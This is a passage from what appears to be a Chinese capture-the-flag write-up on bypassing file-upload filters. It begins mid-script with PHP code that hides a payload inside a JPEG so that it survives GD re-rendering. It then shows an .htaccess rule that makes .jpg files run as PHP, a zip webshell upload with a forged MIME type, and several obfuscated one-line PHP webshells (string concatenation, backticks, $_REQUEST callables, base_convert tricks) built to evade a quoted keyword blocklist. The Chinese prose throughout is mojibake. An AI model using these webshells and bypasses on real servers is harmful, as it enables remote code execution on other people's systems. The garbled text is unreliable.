punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æ‰¾äº†å¥½ä¹…æ‰æ‰¾åˆ°å¯ä»¥é€šè¿‡çš„é©¬</p><p><strong>æ¸²æŸ“å‰</strong></p><p><img src="3_first.jpg" loading="lazy"><em>æ¸²æŸ“å‰</em></p><p><strong>æ¸²æŸ“å</strong></p><p><img src="3_second.jpg" loading="lazy"><em>æ¸²æŸ“å</em></p><p><img src="web165.png" alt="image-20240702212536949" loading="lazy"></p><h4 id="web166-zipè¿½åŠ é©¬"><a href="#web166-zipè¿½åŠ é©¬" class="headerlink" title="web166(zipè¿½åŠ é©¬)"></a>web166(zipè¿½åŠ é©¬)</h4><p>åªå…è®¸ä¸Šä¼ zipæ–‡ä»¶ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªï¼Œç„¶åå†…å®¹æ”¹ä¸ºä¸€å¥è¯æœ¨é©¬å³å¯ï¼Œæˆ‘åœ¨ä¸Šä¼ æ—¶ï¼Œè¿˜æœ‰MIMEæ£€æµ‹æ‰€ä»¥ä¹Ÿéœ€è¦æ”¹</p><p><code>Content-Type=appliaction/x-zip-compressed</code></p><p><img src="web166.png" loading="lazy"></p><p>æœ€åç‚¹å‡»ä¸‹è½½æ–‡ä»¶ï¼ŒæŠ“åŒ…åå‘èµ·POSTè¯·æ±‚å¾—åˆ°flag</p><p><img src="web166_2.png" loading="lazy"></p><h4 id="web167-htaccess"><a href="#web167-htaccess" class="headerlink" title="web167(.htaccess)"></a>web167(.htaccess)</h4><p>é‚£åº”è¯¥å’Œapacheæœ‰å…³ï¼Œä¸»è¦åˆ©ç”¨.htaccessè¿›è¡Œç»•è¿‡äº†</p><p><strong>.htaccessæ–‡ä»¶</strong></p><blockquote><p>htaccess åœ¨ç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸æ˜¯åœ¨apacheç›®å½•ä¸‹ï¼Œä½†æ˜¯å®ƒå±äºapacheçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶</p></blockquote><blockquote><p>htaccessæ–‡ä»¶æ—¶ApacheæœåŠ¡ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301</p><p>é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ï¼Œç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œé…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½</p></blockquote><blockquote><p>å…¶ä¸­.htaccessæ–‡ä»¶å†…å®¹ï¼šSetHandler application&#x2F;x-http-phpçš„æ„æ€æ˜¯è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æï¼Œé‚£ä¹ˆæ— è®ºä¸Šä¼ ä»»ä½•æ–‡</p><p>ä»¶ï¼Œåªè¦ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšPHPæ‰§è¡Œã€‚ä¸ç¬¦åˆè§„åˆ™åˆ™æŠ¥é”™</p></blockquote><p>é¦–å…ˆä¸Šä¼ .htaccess</p><p><code>AddType application/x-httpd-php .jpg</code> &#x2F;&#x2F;å°†.jpgåç¼€çš„æ–‡ä»¶è§£ææˆphp</p><p>ç„¶åå†ä¸Šä¼ 1.jpgï¼Œé‡Œé¢åŠ ä¸Šé©¬çš„å†…å®¹ï¼Œä¹‹åç›´æ¥è®¿é—®xxx&#x2F;upload&#x2F;1.jpgå³å¯</p><h4 id="web168-åé—¨å…æ€"><a href="#web168-åé—¨å…æ€" class="headerlink" title="web168(åé—¨å…æ€)"></a>web168(åé—¨å…æ€)</h4><p><strong>åŸºç¡€å…æ€</strong></p><p>æµ‹è¯•ï¼Œä¼šæ£€æµ‹<code>_GET</code>ã€<code>_POST</code>ã€‚</p><p>å¯æŠ“åŒ…åä¿®æ”¹ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ã€‚</p><p><strong>åå¼•å·</strong></p><p>åå¼•å·è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">// &lt;?= `whoami`</span><span class="token delimiter important">?></span></span></code></pre><p>æŠŠæºç æ‹”ä¸‹æ¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-24 19:34:52# @Last Modified by:   h1xa# @Last Modified time: 2020-10-30 00:11:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"æ–‡ä»¶è¶…è¿‡1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./upload/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"æ–‡ä»¶ç±»å‹ä¸åˆè§„"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æœ¬æ¥è¿˜æƒ³ç€åŒ…å«ä¸€æ³¢æ—¥å¿—ã€‚</p><p><strong>å­—ç¬¦æ‹¼æ¥</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token operator">.</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls ../'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>$_REQUEST</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>æ•°å­¦å‡½æ•°</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>acos<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># getä¼ å‚   abs=system&amp;acos=ls</span></span></code></pre><p><a href="https://yanmie-art.github.io/2020/10/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6web%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">è¿™é‡Œ</a></p><p><strong>å…¶ä»–å‡½æ•°æ„é€ </strong></p><pre class="language-php" data-language="php"><code class="language-php"><span 